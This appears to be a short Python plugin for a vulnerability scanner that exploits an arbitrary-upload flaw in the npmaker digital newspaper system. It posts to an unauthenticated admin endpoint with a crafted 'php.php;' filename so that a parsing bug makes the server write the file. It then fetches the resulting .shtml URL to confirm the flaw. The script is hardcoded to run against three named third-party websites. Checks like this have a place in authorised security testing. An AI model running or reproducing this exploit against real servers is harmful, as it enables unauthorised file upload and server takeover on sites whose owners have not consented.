#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:npmaker数字报 任意上传getshell(需要解析漏洞)
#Refer:http://www.2cto.com/Article/201307/231014.html


def assign(service,arg):
    if service=="xplus":
        return True,arg 


def  audit(arg):
    url=arg+"www/index.php?mod=admin&con=onepage&act=addpost"
    post="onepage%5Bname%5D=c4ca4238a0b923820dcc509a6f75849b&onepage%5Bfilename%5D=php.php;&onepage%5Bcontent%5D=&id=&onepage_submit=%CC%E1%BD%BB"
    code,head,res,errcode,_=curl.curl2(url,post)
    shell_url=arg+"shtml/php.php%3B.shtml"
    code1,head,res1,errcode,_=curl.curl2(shell_url)
    
    if code1==200   and 'c4ca4238a0b923820dcc509a6f75849b' in res1:
        security_hole(shell_url)
if __name__=="__main__":
    from dummy import *
    audit(assign('xplus','http://paper.fynews.net/')[1])
    audit(assign('xplus','http://news.xd56b.com/')[1])
    audit(assign('xplus','http://epaper.xsmd.com.cn/')[1])